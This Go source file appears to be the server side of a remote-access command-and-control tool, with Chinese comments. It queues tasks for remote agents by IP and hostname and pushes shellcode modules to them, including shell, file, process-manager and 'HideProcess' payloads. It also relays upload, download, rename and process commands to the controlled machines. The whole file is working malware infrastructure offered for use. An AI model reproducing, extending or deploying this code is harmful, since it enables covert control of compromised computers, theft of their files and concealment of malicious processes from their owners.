package main

import (
	"encoding/json"
	"fmt"
	"log"
)

// 从客户端发送任务至服务器
func trans_exec(exec interface{}, ip string) {
	// 将map转成json
	data, err := json.Marshal(exec)
	if err != nil {
		fmt.Println(err)
	}

	tmp := string(data)
	if find_str(tmp, tasks[string(ip)]) || find_str(tmp, tasks_send[string(ip)]) {
		return
	}

	// 将该任务加到tasks里

	tasks[ip] = append(tasks[ip], tmp)
	log.Println("tasks : ", tasks[ip])
}

// load shellcode
func trans_load(load Post_Load, ip string) {
	// fmt.Println("load is ", load, "ip", ip)
	var path string
	if load.Data == "file" {
		path = shellcode_path + "FileManager.bin"
		// 获取shellcode二进制文件
		load.Data = get_file_bin(path)
	} else if load.Data == "shell" {
		path = shellcode_path + "ShellManager.bin"
		// 获取shellcode二进制文件
		load.Data = get_file_bin(path)

	} else if load.Data == "process" {
		path = shellcode_path + "ProcessManager.bin"
		// 获取shellcode二进制文件
		load.Data = get_file_bin(path)

	} else if load.Data == "process2" {
		path := shellcode_path + "ProcessManager1.bin"
		// 获取shellcode二进制文件
		load.Data = get_file_bin(path)

	} else if load.Data == "process3" {
		path = shellcode_path + "ProcessManager2.bin"
		load.Data = get_file_bin(path)

	} else if load.Data == "process4" {
		path = shellcode_path + "ProcessManager3.bin"
		load.Data = get_file_bin(path)

	} else if load.Data == "hideprocess" {
		path = shellcode_path + "HideProcess.bin"
		load.Data = get_file_bin(path)

	}
	// 将shellcode发送给Agent
	log.Println("shellcode path is ", path)
	trans_exec(load, ip)

}

func remove_tasks_send(tmp string, ip string) []string {
	j := 0
	for _, v := range tasks_send[ip] {
		if v != tmp {
			tasks_send[ip][j] = v
			j++
		}
	}
	return tasks_send[ip][:j]
}

// 根据ip,hostname 返回需要执行的一个任务
func get_task(ip string, hostname string) string {

	v := tasks[ip][0]
	// for _, v := range tasks[ip] {
	// 将json第一次处理
	var tmp_post_task Post_Task
	if err := json.Unmarshal([]byte(v), &tmp_post_task); err == nil {
		// 判断是不是 Upload请求
		if tmp_post_task.Operation == "upload" {
			var tmp_upload_task Post_Upload
			if err2 := json.Unmarshal([]byte(v), &tmp_upload_task); err2 == nil {
				if tmp_post_task.Hostname == hostname {
					resp := "type=" + tmp_upload_task.Type + "&&operation=" + tmp_upload_task.Operation + "&&file_name=" + tmp_upload_task.File_Name + "&&file_len=" + tmp_upload_task.File_Len + "&&data=" + tmp_upload_task.Data
					return resp
				} else {
					fmt.Println("tmp post task json error", err2)
				}
			}

		}
		// 判断是不是 download请求
		if tmp_post_task.Operation == "download" {
			var tmp_download_task Post_Download
			if err2 := json.Unmarshal([]byte(v), &tmp_download_task); err2 == nil {
				if tmp_post_task.Hostname == hostname {
					resp := "type=" + tmp_download_task.Type + "&&operation=" + tmp_download_task.Operation + "&&file_name=" + tmp_download_task.File_Name
					return resp
				} else {
					fmt.Println("tmp post task json error", err2)
				}
			}
		}
		// 判断是不是 Rename请求
		if tmp_post_task.Operation == "rename" {
			var tmp_rename_task Post_Rename
			if err2 := json.Unmarshal([]byte(v), &tmp_rename_task); err2 == nil {
				if tmp_rename_task.Hostname == hostname {
					resp := "type=" + tmp_rename_task.Type + "&&operation=" + tmp_rename_task.Operation + "&&old_name=" + tmp_rename_task.Old_Name + "&&new_name=" + tmp_rename_task.New_Name
					return resp
				} else {
					fmt.Println("tmp post task json error", err2)
				}
			}
		}
		// 判断是不是 list drivers请求
		if tmp_post_task.Operation == "list_drivers" {
			var tmp_list_drivers Post_List_Drivers
			if err2 := json.Unmarshal([]byte(v), &tmp_list_drivers); err2 == nil {
				if tmp_list_drivers.Hostname == hostname {
					resp := "type=" + tmp_list_drivers.Type + "&&operation=" + tmp_list_drivers.Operation + "&&data=null"
					return resp
				} else {
					fmt.Println("tmp list drivers json error")
				}
			}
		}
		// 判断是不是 process请求
		if tmp_post_task.Operation == "process" || tmp_post_task.Operation == "hideprocess" {
			var tmp_process_task Post_Process
			if err2 := json.Unmarshal([]byte(v), &tmp_process_task); err2 == nil {
				if tmp_process_task.Hostname == hostname {
					resp := "type=" + tmp_process_task.Type + "&&operation=" + tmp_process_task.Operation + "&&file_name=" + tmp_process_task.File_Name + "&&data=" + tmp_process_task.Data
					return resp
				} else {
					fmt.Println("tmp process json error")
				}
			}
		}
		// 其他的通用请求
		if tmp_post_task.Hostname == hostname {
			resp := "type=" + tmp_post_task.Type + "&&operation=" + tmp_post_task.Operation + "&&data=" + tmp_post_task.Data
			return resp
		}
	} else {
		fmt.Println("tmp post task json error", err)
	}
	// }
	return "get task error"
}
